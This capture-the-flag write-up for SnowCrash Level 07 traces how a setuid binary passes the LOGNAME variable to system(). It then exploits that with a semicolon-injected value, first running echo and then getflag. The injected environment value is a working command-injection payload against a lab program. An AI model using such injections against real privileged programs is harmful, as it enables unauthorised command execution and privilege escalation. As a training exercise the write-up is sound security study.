# Level 07

**Exploit:** OS command injection through `LOGNAME`

The program inserts `LOGNAME` into a shell command, so shell syntax in the variable can run an additional command.

## Walkthrough

Inspect the executable and trace how it uses `LOGNAME`:

```bash
file ./level07
```

Output:

```text
./level07: setuid setgid ELF 32-bit LSB executable
```

```bash
strings ./level07
```

Output:

```text
LOGNAME
/bin/echo %s 
```

```bash
ltrace ./level07
```

Output:

```text
getenv("LOGNAME")                                               = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
```

The trace shows that the program passes `LOGNAME` to `echo`. Test command injection with a harmless command:

```bash
export LOGNAME='this will be printed; echo "bonjour"'
```

```text
level07@SnowCrash:~$ ./level07 
this will be printed
bonjour
```

The semicolon starts a second shell command. Replace the harmless command with `getflag`:

```bash
export LOGNAME='this will be printed by the program then the following will get executed; getflag'
```

Run `./level07` again to execute the injected command and display the flag.
